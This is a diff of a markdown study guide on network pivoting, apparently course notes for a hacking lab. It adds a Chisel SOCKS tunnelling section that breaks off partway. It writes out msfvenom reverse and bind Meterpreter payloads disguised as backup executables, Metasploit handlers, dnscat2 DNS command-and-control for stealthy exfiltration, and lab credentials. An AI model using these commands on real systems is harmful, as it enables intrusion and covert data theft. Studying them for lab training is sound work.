 [-] No arch selected, selecting arch: x64 from the payload
@@ -916,6 +935,7 @@ msf6 exploit(multi/handler) > set lhost 0.0.0.0
 msf6 exploit(multi/handler) > set lport 8000
 msf6 exploit(multi/handler) > run
 ```
+
 ```bash
 [*] Started HTTPS reverse handler on https://0.0.0.0:8000
 ```
@@ -927,6 +947,7 @@ Once our payload is created and we have our listener configured & running, we ca
 ```bash
 scp backupscript.exe ubuntu@10.129.15.50:~/
 ```
+
 ```bash
 backupscript.exe                                   100% 7168    65.4KB/s   00:00
 ```
@@ -988,9 +1009,11 @@ If all is set up properly, we will receive a Meterpreter shell pivoted via the U
 
 meterpreter >
 ```
+
 ```bash
 meterpreter > shell
 ```
+
 ```bash
 Process 3236 created.
 Channel 1 created.
@@ -1008,28 +1031,28 @@ The below graphical representation provides an alternative way to understand thi
 flowchart LR
   %% Attack Host
   ATT["<b>Attack Host</b><br/><br/>10.10.15.5<br/><br/>💻<br/><br/><b>MSFConsole: 8000</b>"]
-  
+
   %% SSH Connection Info
   SSH["<b>SSH 0.0.0.0:22</b><br/><br/><b>Listens on port 8080,</b><br/><b>Forwards 8080</b><br/><b>to SSH</b>"]
-  
+
   %% Victim Server Ubuntu
   VIC1["<b>Victim Server (Ubuntu)</b><br/><br/>10.129.15.50<br/>172.16.5.129<br/><br/>🗄️"]
-  
+
   %% Victim Server Windows A
   VIC2["<b>Victim Server (Windows A)</b><br/><br/>172.16.5.19<br/><br/><b>RDP Service</b><br/><br/>🗄️"]
-  
+
   %% Connections
   ATT ==>|"<b>Forward remote<br/>port 8080 to local<br/>port 8000</b>"| SSH
   SSH <-->|"<b>SSH Tunnel</b>"| VIC1
   VIC1 ==>|"<b>Reverse HTTPS Shell</b>"| VIC2
   VIC2 -.->|"<b>Reverse shell<br/>forwarded to port<br/>8000 (msfconsole)</b>"| ATT
-  
+
   %% Styling
   style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
   style SSH fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
   style VIC1 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
   style VIC2 fill:#1a2332,stroke:#9ACD32,stroke-width:4px,color:#fff
-  
+
   linkStyle 0 stroke:#ff6b6b,stroke-width:4px,stroke-dasharray:5
   linkStyle 1 stroke:#9ACD32,stroke-width:4px
   linkStyle 2 stroke:#ff0000,stroke-width:4px
@@ -1058,6 +1081,7 @@ We can generate a Meterpreter shell for the Ubuntu server, which will give us a 
 ```bash
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f elf -o shell.elf
 ```
+
 ```bash
 # [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 # [-] No arch selected, selecting arch: x64 from the payload
@@ -1072,9 +1096,10 @@ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f el
 ```bash
 scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
 ```
+
 ```bash
-# ubuntu@10.129.202.64's password: 
-# shell.elf    
+# ubuntu@10.129.202.64's password:
+# shell.elf
 ```
 
 Before executing the payload over, we can start a Metasploit multi/handler, also known as a Generic Payload Handler.
@@ -1089,7 +1114,7 @@ Before executing the payload over, we can start a Metasploit multi/handler, also
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 4444
 # LPORT => 4444
 [msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
-# [*] Started reverse TCP handler on 10.10.14.40:4444 
+# [*] Started reverse TCP handler on 10.10.14.40:4444
 ```
 
 **Execute the Payload on the Pivot Host**
@@ -1214,7 +1239,7 @@ This allows external tools (proxychains, nmap, etc.) to pivot through Meterprete
 # SRVPORT => 1080
 [msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
 # [*] Auxiliary module running as background job 0.
-[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> 
+[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >>
 # [*] Starting the SOCKS proxy server
 
 #NOTE: PRESS ENTER TO KEEP USING THE CONSOLE
@@ -1270,6 +1295,7 @@ The above command requests the Meterpreter session to start a listener on our at
 ```bash
 nc -v 127.0.0.1 3389
 ```
+
 ```bash
 # localhost [127.0.0.1] 3389 (ms-wbt-server) open
 ```
@@ -1284,6 +1310,7 @@ nc -v 127.0.0.1 3389
 ```bash
 xfreerdp /v:localhost /u:victor /p:pass@123
 ```
+
 ```bash
 # [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-1640397/.config/freerdp
 # [19:43:10:569] [49955:49956] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-1640397/.config/freerdp/certs]
@@ -1293,7 +1320,7 @@ xfreerdp /v:localhost /u:victor /p:pass@123
 # [19:43:11:994] [49955:49956] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 # [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
 # [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - The hostname used for this connection (localhost:3389) 
+# [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - The hostname used for this connection (localhost:3389)
 # [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
 # [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - Common Name (CN):
 # [19:43:11:995] [49955:49956] [ERROR][com.freerdp.crypto] - 	DC01.inlanefreight.local
@@ -1343,7 +1370,7 @@ flowchart LR
     U["<b>🖥️ Ubuntu Server</b><br/>10.129.202.64<br/>172.16.5.129"]
     V["<b>🖥️ Windows Victim</b><br/>172.16.5.19<br/>User: INLANEFREIGHT\victor"]
     P["<b>📦 Payload</b><br/>backupscript.exe<br/>LHOST=172.16.5.129:8080"]
-    
+
     %% Connections
     MH ---|"<b>Running on</b>"| A
     S ---|"<b>Running on</b>"| U
@@ -1351,7 +1378,7 @@ flowchart LR
     V -.->|"<b>1.</b> Reverse Connection"| S
     S -.->|"<b>2.</b> Forwards to"| MH
     MH ==>|"<b>3.</b> Meterpreter Session<br/>Established"| A
-    
+
     %% Styling
     style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style MH fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
@@ -1359,7 +1386,7 @@ flowchart LR
     style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
     style V fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
     style P fill:#8b6a3a,stroke:#ff9500,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#9b87f5,stroke-width:2px
     linkStyle 1 stroke:#6c8ebf,stroke-width:2px
@@ -1384,6 +1411,7 @@ A listener must also be started on the attack host because any connection receiv
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
 ```
+
 ```bash
 # [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 # [-] No arch selected, selecting arch: x64 from the payload
@@ -1398,6 +1426,7 @@ Now, we must transfer this payload to the Windows host.
 ```bash
 scp shell.elf ubuntu@10.129.202.64:/home/ubuntu/
 ```
+
 ```bash
 # [-]
 ```
@@ -1453,14 +1482,14 @@ flowchart LR
     V1["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129"]
     BS["<b>📁 Bind Shell</b><br/>Listen: 8443"]
     V2["<b>🖥️ Victim Server (Windows A)</b><br/>172.16.5.19<br/>RDP Service"]
-    
+
     %% Connections
     A -->|"<b>Stage Request</b>"| M
     M -.->|"<b>Stage Request</b>"| S
     S -.->|"<b>Forward</b>"| V1
     V1 -.->|"<b>Response</b>"| BS
     BS -.->|"<b>Response</b>"| V2
-    
+
     %% Styling
     style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style M fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
@@ -1468,7 +1497,7 @@ flowchart LR
     style V1 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
     style BS fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
     style V2 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#ff6b6b,stroke-width:3px
     linkStyle 1 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
@@ -1482,6 +1511,7 @@ flowchart LR
 ```bash
 msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
 ```
+
 ```bash
 # [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 # [-] No arch selected, selecting arch: x64 from the payload
@@ -1506,6 +1536,7 @@ Finally, we can start a Metasploit bind handler. This bind handler can be config
 ```bash
 sudo msfconsole
 ```
+
 ```bash
 use exploit/multi/handler
 
@@ -1549,8 +1580,8 @@ Plink (PuTTY Link) is a command-line SSH tool for Windows included with the PuTT
 
 It can perform:
 
-* Dynamic port forwarding
-* SOCKS proxy creation
+- Dynamic port forwarding
+- SOCKS proxy creation
 
 > **NOTE:** Before Fall 2018, Windows did not ship with a native SSH client. PuTTY became the go-to tool for many system administrators who needed to connect to remote hosts.
 
@@ -1563,8 +1594,8 @@ Imagine the following situation:
 
 You need to pivot through this machine, but:
 
-* Pulling your own tools is risky
-* Exposure is likely
+- Pulling your own tools is risky
+- Exposure is likely
 
 If PuTTY is already installed —or if a copy exists on a file share— Plink becomes the pivoting solution, allowing you to operate longer without detection.
 
@@ -1576,35 +1607,35 @@ flowchart TB
     W["<b>💻 Windows Attack Host</b><br/>10.10.15.5"]
     M["<b>MSTSC.exe</b><br/>(RDP Client)"]
     PA["<b>Proxifier Agent</b>"]
-    
+
     %% Nodes - Middle Section (Horizontal)
     subgraph TUNNEL[" "]
         direction LR
         SL["<b>SOCKS Listener</b><br/>Port: 9050"]
         PC["<b>Plink SSH Client</b>"]
         SSH["<b>SSH Tunnel</b><br/>0.0.0.0:22"]
-        
+
         SL <-.->|"<b>Forward Packets</b>"| PC
         PC -.->|"<b>Port Forward<br/>8080 → 80</b>"| SSH
     end
-    
+
     %% Nodes - Victim Section (Horizontal)
     subgraph VICTIMS[" "]
         direction LR
         U["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129"]
         WV["<b>🖥️ Victim Server (Windows A)</b><br/>172.16.5.19<br/>RDP Service"]
-        
+
         U ==>|"<b>Forward RDP</b>"| WV
     end
-    
+
     %% Connections - Vertical Flow
     W --> M
     M -.->|"<b>Send Packets</b>"| PA
     PA -.->|"<b>Forward to SOCKS</b>"| SL
-    
+
     %% Connections - Between Sections
     SSH ==>|"<b>Forward RDP traffic<br/>over Plink SSH</b>"| U
-    
+
     %% Styling
     style W fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style M fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
@@ -1616,7 +1647,7 @@ flowchart TB
     style WV fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
     style TUNNEL fill:none,stroke:#6c8ebf,stroke-width:2px,stroke-dasharray:5
     style VICTIMS fill:none,stroke:#90EE90,stroke-width:2px,stroke-dasharray:5
-    
+
     %% Link styling
     linkStyle 0 stroke:#6c8ebf,stroke-width:3px,stroke-dasharray:5
     linkStyle 1 stroke:#ff9500,stroke-width:3px,stroke-dasharray:5
@@ -1635,6 +1666,7 @@ flowchart TB
 The Windows attack host starts a plink.exe process to start a dynamic port forward over the Ubuntu server. This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.
 
 **Using Plink.exe**
+
 ```cmd
 plink -ssh -D 9050 ubuntu@10.129.15.50
 ```
@@ -1647,16 +1679,17 @@ plink -ssh -D 9050 ubuntu@10.129.15.50
 Proxifier is another Windows-based tool that can establish a SOCKS tunnel through the SSH session previously created.
 
 It provides the ability to:
-* Create a tunneled network path for desktop applications
-* Route traffic through SOCKS or HTTPS proxies
-* Perform proxy chaining
+
+- Create a tunneled network path for desktop applications
+- Route traffic through SOCKS or HTTPS proxies
+- Perform proxy chaining
 
 You can create a Proxifier profile that specifies:
-| Setting           | Value                |
+| Setting | Value |
 | ----------------- | -------------------- |
-| SOCKS server host | `127.0.0.1`          |
-| SOCKS server port | `9050`               |
-| Source            | Plink’s SOCKS tunnel |
+| SOCKS server host | `127.0.0.1` |
+| SOCKS server port | `9050` |
+| Source | Plink’s SOCKS tunnel |
 
 </details>
 
@@ -1680,19 +1713,22 @@ This starts an RDP session with a Windows target that permits RDP connections, u
 
 **[Sshuttle](https://github.com/sshuttle/sshuttle)** is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. Sshuttle can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.
 
-One interesting usage of *sshuttle* is that we don't need to use *proxychains* to connect to the remote hosts. 
+One interesting usage of _sshuttle_ is that we don't need to use _proxychains_ to connect to the remote hosts.
 
 **Install sshuttle**
+
 ```bash
 sudo apt-get install sshuttle
 ```
 
-To use *sshuttle*, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network `172.16.5.0/23`.
+To use _sshuttle_, we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network `172.16.5.0/23`.
 
 **Run sshuttle**
+
 ```bash
-sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
+sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
 ```
+
 ```bash
 # Starting sshuttle proxy (version 1.1.0).
 # c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/local/lib/python3.9/dist-packages/sshuttle/__main__.py', '-v', '--method', 'auto', '--firewall']
@@ -1735,12 +1771,14 @@ sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
 # fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.0/32 -p tcp --to-ports 12300
 ```
 
-With this command, *sshuttle* creates an entry in our iptables to redirect all traffic to the `172.16.5.0/23` network through the pivot host.
+With this command, _sshuttle_ creates an entry in our iptables to redirect all traffic to the `172.16.5.0/23` network through the pivot host.
 
 **Traffic Routing through iptables Routes**
+
 ```bash
 sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
 ```
+
 ```bash
 # Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 # Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-01 12:54 CST
@@ -1788,7 +1826,7 @@ sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
 # | Not valid after:  2026-06-01T18:52:36
 # | MD5:   f9fa:15f2:b84c:3343:82bc:79bd:2e89:2629
 # |_SHA-1: 5b34:3b52:9b67:4462:4c67:d373:23e5:d2d2:b96c:bf9d
-# | rdp-ntlm-info: 
+# | rdp-ntlm-info:
 # |   Target_Name: INLANEFREIGHT
 # |   NetBIOS_Domain_Name: INLANEFREIGHT
 # |   NetBIOS_Computer_Name: DC01
@@ -1840,20 +1878,20 @@ flowchart LR
     U["<b>🖥️ Victim Server (Ubuntu)</b><br/>10.129.15.50<br/>172.16.5.129<br/><i>Dual Homed</i>"]
     W["<b>🖥️ Victim Server (Webserver)</b><br/>172.16.5.135<br/>Webserver on Port 80"]
     INT["<b>🔒 Internal Network</b><br/>172.16.5.0"]
-    
+
     %% Connections
     A -.->|"<b>Connect</b>"| EXT
     EXT -.->|"<b>Access</b>"| U
     U -.->|"<b>Pivot</b>"| INT
     INT -.->|"<b>Access</b>"| W
-    
+
     %% Styling
     style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style EXT fill:#4a5a8b,stroke:#9b87f5,stroke-width:3px,color:#fff
     style U fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
     style W fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
     style INT fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
-    
+
     %% Link styling
     linkStyle 0 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
     linkStyle 1 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
@@ -1862,12 +1900,13 @@ flowchart LR
 ```
 
 **Cloning rpivot**
+
 ```bash
 git clone https://github.com/klsecservices/rpivot.git
 ```
 
-
 **Installation of Python2.7**
+
 ```bash
 curl https://pyenv.run | bash
 echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
@@ -1881,11 +1920,13 @@ pyenv shell 2.7
 We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
 
 **Running server.py from the Attack Host**
+
 ```bash
 python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
 ```
 
 **Setting SOCKS5**
+
 ```bash
 sudo sed -i '/^socks/d' /etc/proxychains.conf && echo 'socks5 127.0.0.1 9050' | sudo tee -a /etc/proxychains.conf
 ```
@@ -1893,14 +1934,17 @@ sudo sed -i '/^socks/d' /etc/proxychains.conf && echo 'socks5 127.0.0.1 9050' | 
 Before running client.py we will need to transfer rpivot folder to the target. We can do this using this SCP command:
 
 **Transferring rpivot to the Target**
+
 ```bash
 scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
 ```
 
 **Running client.py from Pivot Target**
+
 ```bash
 python2.7 client.py --server-ip 10.10.15.165 --server-port 9999
 ```
+
 ```bash
 # Backconnecting to server 10.10.14.18 port 9999
 
@@ -1912,6 +1956,7 @@ We will configure proxychains to pivot over our local server on 127.0.0.1:9050 o
 Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.
 
 **Browsing to the Target Webserver using Proxychains**
+
 ```bash
 proxychains firefox-esr 172.16.5.135:80
 ```
@@ -1919,6 +1964,7 @@ proxychains firefox-esr 172.16.5.135:80
 Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
 
 **Connecting to a Web Server using HTTP-Proxy & NTLM Auth**
+
 ```bash
 python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
 ```
@@ -1930,10 +1976,10 @@ python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --n
 
 **[Netsh](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh)** is a Windows command-line tool that can help with the network configuration of a particular Windows system. Here are just some of the networking related tasks we can use Netsh for:
 
-* Finding routes
-* Viewing the firewall configuration
-* Adding proxies
-* Creating port forwarding rules
+- Finding routes
+- Viewing the firewall configuration
+- Adding proxies
+- Creating port forwarding rules
 
 Let's take an example of the below scenario where our compromised host is a Windows 10-based IT admin's workstation (`10.129.15.150`, `172.16.5.25`). Keep in mind that it is possible on an engagement that we may gain access to an employee's workstation through methods such as social engineering and phishing. This would allow us to pivot further from within the network the workstation is in.
 
@@ -1941,28 +1987,28 @@ Let's take an example of the below scenario where our compromised host is a Wind
 flowchart LR
     %% Nodes
     A["<b>🔴 Attack Host</b><br/>10.10.15.5"]
-    
+
     subgraph PIVOT[" "]
         direction TB
         L["<b>Listen on</b><br/>10.129.15.150:<span style='color:#FFD700'>8080</span>"]
         N["<b>Netsh.exe</b>"]
         F["<b>Forward to</b><br/>172.16.5.25:<span style='color:#FFD700'>3389</span>"]
-        
+
         L -.->|" "| N
         N -.->|" "| F
     end
-    
+
     subgraph VICTIMS[" "]
         direction LR
         W1["<b>🖥️ Windows10 User(pwn)</b><br/>10.129.15.150<br/>172.16.5.19"]
         W2["<b>🖥️ Windows Server</b><br/>172.16.5.25<br/>RDP Service"]
     end
-    
+
     %% Connections
     A -.->|"<b>RDP Request</b>"| L
     F -.->|"<b>Forwards RDP<br/>Service Request</b>"| W1
     W1 -.->|"<b>RDP Connection</b>"| W2
-    
+
     %% Styling
     style A fill:#8b3a3a,stroke:#ff6b6b,stroke-width:3px,color:#fff
     style L fill:#2d3e50,stroke:#6c8ebf,stroke-width:3px,color:#fff
@@ -1972,7 +2018,7 @@ flowchart LR
     style W2 fill:#3a5a3a,stroke:#90EE90,stroke-width:3px,color:#fff
     style PIVOT fill:none,stroke:#6c8ebf,stroke-width:2px,stroke-dasharray:5
     style VICTIMS fill:none,stroke:#90EE90,stroke-width:2px,stroke-dasharray:5
-    
+
     %% Link styling
     linkStyle 0 stroke:#FFD700,stroke-width:2px,stroke-dasharray:3
     linkStyle 1 stroke:#FFD700,stroke-width:2px,stroke-dasharray:3
@@ -1980,7 +2026,6 @@ flowchart LR
     linkStyle 3 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
     linkStyle 4 stroke:#90EE90,stroke-width:3px,stroke-dasharray:5
 ```
-
 
 **Connect to the pivot machine**
 
@@ -1999,11 +2044,9 @@ xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
 </tr>
 </table>
 
-
-We can use *netsh.exe* to forward all data received on a specific port (say 8080) to a remote host on a remote port.
+We can use _netsh.exe_ to forward all data received on a specific port (say 8080) to a remote host on a remote port.
 
 **Using Netsh.exe to Port Forward**
-
 
 <table width="100%">
 <tr>
@@ -2040,7 +2083,6 @@ netsh advfirewall firewall add rule name="PortForward 8080" dir=in action=allow 
 </table>
 
 **Verifying Port Forward**
-
 
 <table width="100%">
 <tr>
@@ -2099,7 +2141,6 @@ xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
 </tr>
 </table>
 
-
 </details>
 
 </details>
@@ -2120,7 +2161,7 @@ Dnscat2 is a tunneling tool designed to establish an encrypted Command and Contr
 
 2. **Encapsulated Exfiltration:** Instead of sending legitimate resolution requests, Dnscat2 encapsulates data (commands and stolen information) within the fields of DNS records, typically using TXT records.
 
-3. **Surreptitious Operation:** When the victim machine attempts to *"resolve"* a malicious domain, the query is directed through the internal DNS server, bypasses the corporate firewall, and eventually reaches the attacker's Dnscat2 server (C2). This achieves data exfiltration stealthily, evading detection based on inspection of web protocols like HTTPS/HTTP.
+3. **Surreptitious Operation:** When the victim machine attempts to _"resolve"_ a malicious domain, the query is directed through the internal DNS server, bypasses the corporate firewall, and eventually reaches the attacker's Dnscat2 server (C2). This achieves data exfiltration stealthily, evading detection based on inspection of web protocols like HTTPS/HTTP.
 
 In essence, Dnscat2 transforms an essential, low-inspection network protocol (DNS) into a secret communication channel.
 
@@ -2131,41 +2172,41 @@ flowchart LR
         direction TB
         DNSCAT_S["**Dnscat2 Server**<br/>(🎧 Listener)"]
     end
-    
+
     subgraph CORP["**Corporate Network (Victim)** 🏢"]
         direction TB
         WIN_C["**Windows Host**<br/>(💻 Victim Client)"]
         DNS_I["**Internal DNS Server** 📜"]
         FIREWALL["**Firewall / IPS**<br/>(🛡️ Inspects HTTPS/HTTP)"]
     end
-    
+
     DNS_E["**External DNS Resolver**<br/>(🌎 e.g., 8.8.8.8)"]
-    
+
     %% Connection and Exfiltration Flow
-    
+
     %% 1. The client initiates a malicious 'DNS resolution' via its internal DNS server (not a legitimate query)
     WIN_C -- 1. Execute Dnscat2 Client 👻 --> DNS_I
-    
+
     %% 2. The internal DNS attempts to resolve the external request (which is the tunnel traffic)
     DNS_I -- 2. Exfiltration Query (DNS) ❓ --> FIREWALL
-    
+
     %% 3. The Firewall allows external DNS traffic (UDP port 53)
     FIREWALL -- 3. Allowed Traffic (DNS) ✅ --> DNS_E
-    
+
     %% 4. The external DNS cannot resolve the malicious domain and forwards it to the attacker's DNS server (the C&C Server)
     DNS_E -- 4. Malicious DNS Query Forwarding ➡️ --> DNSCAT_S
-    
+
     %% 5. The C&C Server encapsulates the response and returns the C&C command (in TXT Records)
     DNSCAT_S -- 5. Encapsulated C2 Response (TXT Records) 📦 --> DNS_E
-    
+
     %% 6. The C2 response returns to the client
     DNS_E -- 6. C2 Response (TXT Records) ↩️ --> FIREWALL
     FIREWALL -- 7. C2 Reply 📩 --> DNS_I
     DNS_I -- 8. C2 Delivery to Client 🎯 --> WIN_C
-    
+
     %% Tunnel Data Flow (Emphasis on Exfiltration)
     WIN_C -.-|**DNS Tunnel 🚇 - TXT Records / Encrypted C2**| DNSCAT_S
-    
+
     %% Styling
     style ATT fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
     style CORP fill:#1a2332,stroke:#9ACD32,stroke-width:3px,color:#fff
@@ -2174,7 +2215,7 @@ flowchart LR
     style DNS_I fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
     style FIREWALL fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
     style DNS_E fill:#2d3e50,stroke:#6c8ebf,stroke-width:2px,color:#fff
-    
+
     %% Link Styling
     %% Exfiltration Data Flow (Highlighted in Dashed Red for C2)
     linkStyle 8 stroke:#ff6b6b,stroke-width:3px,stroke-dasharray:5
@@ -2301,7 +2342,7 @@ Once the **dnscat2.ps1** file is on the target we can import it and run associat
 
 ```powershell
 Import-Module .\dnscat2.ps1
-Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
 ```
 
 </td>
@@ -2422,6 +2463,212 @@ exec (OFFICEMANAGER) 1>
 </tr>
 </table>
 
+</details>
+
+<details>
+<summary><h2>SOCKS5 Tunneling with Chisel</h2></summary>
+
+**1. Download the release binary, unzip it, rename it to 'chisel' and make it executable**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
+gzip -d chisel_1.9.1_linux_amd64.gz
+mv chisel_1.9.1_linux_amd64 chisel
+chmod +x chisel
+```
+
+</td>
+</tr>
+</table>
+
+**2. Transfer Chisel Binary to Pivot Host**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+scp chisel ubuntu@10.129.2.82:~/
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# The authenticity of host '10.129.2.82 (10.129.2.82)' can't be established.
+# ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
+# This key is not known by any other names.
+# Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+# Warning: Permanently added '10.129.2.82' (ED25519) to the list of known hosts.
+# ubuntu@10.129.2.82's password:
+# chisel                                                                                      100% 8452KB   1.7MB/s   00:04
+```
+
+</td>
+</tr>
+</table>
+
+**3. Start the Chisel server in the Ubuntu machine**
+
+<table width="100%">
+<tr>
+<td colspan="2"> 🚇 <b>bash — Linux - Pivot</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`ubuntu@10.129.2.82:~$`**
+
+</td>
+<td>
+
+```bash
+./chisel server -v -p 1234 --socks5
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# 2026/01/22 02:46:36 server: Fingerprint +GRyOYAbt/Lns8wZBAXsIgJlbg8NtFxPddSx7HXjteM=
+# 2026/01/22 02:46:36 server: Listening on http://0.0.0.0:1234
+```
+
+</td>
+</tr>
+</table>
+
+**4. Start the Chisel client in the Attack machine**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+./chisel client -v 10.129.2.82:1234 socks
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# 2026/01/21 20:47:30 client: Connecting to ws://10.129.2.82:1234
+# 2026/01/21 20:47:30 client: tun: proxy#127.0.0.1:1080=>socks: Listening
+# 2026/01/21 20:47:30 client: tun: Bound proxies
+# 2026/01/21 20:47:30 client: Handshaking...
+# 2026/01/21 20:47:31 client: Sending config
+# 2026/01/21 20:47:31 client: Connected (Latency 66.442711ms)
+# 2026/01/21 20:47:31 client: tun: SSH connected
+```
+
+</td>
+</tr>
+</table>
+
+**6. Configure Proxychains to use SOCKS5**
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+tail -f /etc/proxychains.conf
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
